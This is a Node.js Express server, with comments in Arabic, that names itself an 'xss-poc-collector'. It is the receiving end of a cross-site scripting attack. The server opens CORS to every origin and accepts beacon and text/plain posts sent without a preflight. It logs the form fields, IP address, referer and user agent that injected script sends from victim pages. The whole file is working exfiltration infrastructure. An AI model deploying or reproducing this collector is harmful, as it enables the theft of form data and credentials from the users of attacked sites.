const express = require('express');
const app = express();

// السماح بطلبات المتصفح من أي Origin وتمرير Preflight (OPTIONS)
app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', origin || '*');
  res.setHeader('Vary', 'Origin');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Max-Age', '86400');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  next();
});

// قراءة مختلف أنواع البيانات (بما في ذلك text/plain الذي يرسله sendBeacon أو fetch بدون Preflight)
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true, limit: '5mb' }));
app.use(express.text({ type: ['text/*', 'application/xml', 'application/*+xml'], limit: '5mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '5mb' }));

const ALLOWED_T_VALUES = new Set(['0', '1', '2', '3', '4', '5', '6']);

function parseBodySafe(req) {
  if (Buffer.isBuffer(req.body)) {
    const str = req.body.toString('utf8');
    try {
      return JSON.parse(str);
    } catch (_) {
      return str;
    }
  }
  if (typeof req.body === 'string') {
    try {
      return JSON.parse(req.body);
    } catch (_) {
      return req.body;
    }
  }
  return req.body || {};
}

function extractTrackInfo(req, parsedBody) {
  const bodyObj = typeof parsedBody === 'object' && parsedBody !== null ? parsedBody : {};
  const rawUrl = bodyObj.href || bodyObj.url || req.headers.referer || '';
  let tParam = req.query.t || bodyObj.t || null;

  if (!tParam && rawUrl) {
    try {
      const parsed = new URL(rawUrl);
      tParam = parsed.searchParams.get('t');
    } catch (_) {
      const match = String(rawUrl).match(/[?&]t=([0-6])\b/);
      if (match) tParam = match[1];
    }
  }

  return {
    t: tParam !== null ? String(tParam) : 'unknown',
    isAllowedTrack: tParam !== null ? ALLOWED_T_VALUES.has(String(tParam)) : false,
    sourceUrl: rawUrl || 'none'
  };
}

app.get('/', (req, res) => {
  res.status(200).json({
    status: 'ok',
    service: 'xss-poc-collector',
    tracks: Array.from(ALLOWED_T_VALUES)
  });
});

// مسار استقبال البيانات لحظة الإرسال عبر /collect
app.all('/collect', (req, res) => {
  const parsedBody = parseBodySafe(req);
  const track = extractTrackInfo(req, parsedBody);
  const fields =
    typeof parsedBody === 'object' && parsedBody !== null && parsedBody.fields
      ? parsedBody.fields
      : parsedBody;

  console.log('=== [RECEIVED ON SUBMIT / POC] ===');
  console.log('Time:', new Date().toISOString());
  console.log('IP / X-Forwarded-For:', req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'none');
  console.log('Method:', req.method);
  console.log('Content-Type:', req.headers['content-type'] || 'none');
  console.log('Origin:', req.headers.origin || 'none');
  console.log('Referer:', req.headers.referer || 'none');
  console.log('Track (t):', track.t, '| Allowed t (0..6):', track.isAllowedTrack);
  console.log('Source URL:', track.sourceUrl);
  console.log('User-Agent:', req.headers['user-agent'] || 'none');
  console.log('Fields:', JSON.stringify(fields, null, 2));

  if (req.method === 'POST' && res.statusCode === 200 && req.headers['content-type']?.includes('text/plain') && !parsedBody?.expectsJson) {
    return res.status(204).end();
  }

  res.status(200).json({
    ok: true,
    track: track.t,
    receivedAt: new Date().toISOString()
  });
});

process.on('uncaughtException', (err) => {
  console.error('[UNCAUGHT EXCEPTION]:', err);
});

process.on('unhandledRejection', (reason) => {
  console.error('[UNHANDLED REJECTION]:', reason);
});

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Collector listening on port ${PORT}`);
});

server.on('error', (err) => {
  console.error('[SERVER LISTEN ERROR]:', err);
  process.exit(1);
});
